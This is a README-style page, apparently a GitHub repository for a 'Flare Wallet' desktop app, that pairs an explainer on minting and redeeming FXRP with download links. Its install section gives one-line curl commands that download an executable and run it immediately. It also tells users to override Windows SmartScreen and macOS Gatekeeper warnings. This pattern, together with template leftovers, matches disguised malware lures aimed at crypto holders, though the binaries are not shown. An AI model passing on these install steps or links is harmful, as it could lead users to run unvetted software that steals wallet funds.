![Flare Wallet](assets/banner-article.png)

# Flare Wallet FXRP: Mint, Hold and Redeem XRP on Flare

How XRP becomes a Flare token, what backs it, and the way back.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

FXRP is one of the three tokens the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) holds alongside FLR and WFLR.

> FXRP is a claim on XRP, not a second XRP. If the redemption path is unclear to you, do not treat the balance as spendable XRP.

FXRP is XRP represented on Flare through the FAssets system. XRP is held on the XRP Ledger by the agents that back the system, the payment is verified on Flare, and an equivalent amount of FXRP is issued on the Flare side. Redeeming reverses it: FXRP is returned and the underlying XRP is released.

<!-- ARTICLE-BODY-BEGIN -->

## What FXRP is, in one paragraph

It is a token on Flare whose supply is matched by XRP held by the FAssets system. You do not buy it from a company and you do not receive a promise; you mint it against XRP you already own, and the system verifies that the XRP actually arrived before issuing anything.

Because the backing is one to one, FXRP is intended to move with XRP rather than to have a life of its own. That is the difference between holding FXRP and holding some other token that merely mentions XRP in its documentation.

## The mint, step by step in principle

1. You send XRP on the XRP Ledger to the address the system gives you for the operation, with the reference that identifies your mint.
2. The FAssets system verifies that payment on the XRP Ledger.
3. FXRP is issued on Flare to the address you specified.
4. You hold FXRP in a Flare wallet and can move it like any other token on the chain.

The order matters: nothing is issued before the XRP payment is verified, which is what makes the token backed rather than promised. The exact interface you use to start a mint, and the current fee percentage, are not verified by this page and are deliberately not stated as numbers.

## Why the price of FXRP is the price of XRP

If one FXRP is redeemable for one XRP, then a rational market prices it at one XRP less the cost and friction of redeeming. A quote that drifts far from XRP is a signal about liquidity or about the redemption path, not a bargain.

That is also why this page does not print a number. XRP trades continuously, and any figure would be stale before it loaded. Use a market data source for the price and this page for the mechanism.

## Redeeming back to XRP

Redemption runs the same path in reverse: you return FXRP on Flare, the system releases the corresponding XRP on the XRP Ledger to the address you nominate, and the FXRP is destroyed. Both directions depend on the same verification, which is why neither is instant.

Two practical points. First, redemption is not a transfer between chains; it is a protocol operation with its own timing. Second, the XRP arrives on the XRP Ledger, so the destination must be an XRP Ledger address, not a Flare address. Mixing those up is the most common way to lose a redemption.

## The fee question

Minting and redeeming both carry a cost, and the percentage is set by the system rather than by the wallet. This page does not quote it, because the figure it could quote would be unverified and possibly stale. Ask for the quote at the moment you start the operation, and treat any site advertising a fixed fee as out of date by definition.

The wallet will show the network fee for the Flare-side transaction, which is a different cost from the mint or redemption fee.

## How FXRP differs from WFLR

Both are tokens that represent something else, and they are easy to confuse. WFLR is wrapped FLR: it exists so that delegation has a token to work with, and unwrapping returns the same FLR. FXRP is a claim on an asset from another chain, and its redemption involves a second network.

The wrapping mechanics are in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-wflr.md">Flare Wallet WFLR</a>; the XRP-side background, including why Flare is not a Ripple product, is in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-xrp.md">Flare Wallet XRP</a>.

## Checking that FXRP actually arrived

Look at the receiving address on the Flare explorer rather than at the wallet's own confirmation. If the token contract is right and the amount is right, the balance is real regardless of what any interface says. The address checks that catch a wrong destination are in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-address.md">Flare Wallet address</a>.

## FAQ

### What is FXRP?

XRP represented on Flare through FAssets. It is issued after an XRP payment is verified on the XRP Ledger and can be redeemed back to XRP.

### How much is FXRP?

It is designed to track XRP one to one, minus the cost of redemption, so its value follows XRP rather than trading independently. This page does not publish prices.

### How does FXRP get on Flare?

You send XRP to the address the system provides with a reference identifying your mint; the payment is verified, and FXRP is issued on Flare to your address.

### How do I redeem FXRP back to XRP?

Return the FXRP on Flare and nominate an XRP Ledger address for the release. The XRP arrives on the XRP Ledger, not on Flare, so the destination must be an XRPL address.

### What fee applies when minting FXRP?

The system sets it, and this page does not state a figure it cannot verify. Get the quote at the moment you start the operation and read it before you sign.

### Can I hold FXRP without a Flare wallet?

You need something that reads Flare mainnet to see and move the token. The desktop wallet holds FXRP alongside FLR and WFLR; install it from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet XRP](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-xrp.md) | [Flare Wallet WFLR](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-wflr.md) | [Flare Wallet address](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-address.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
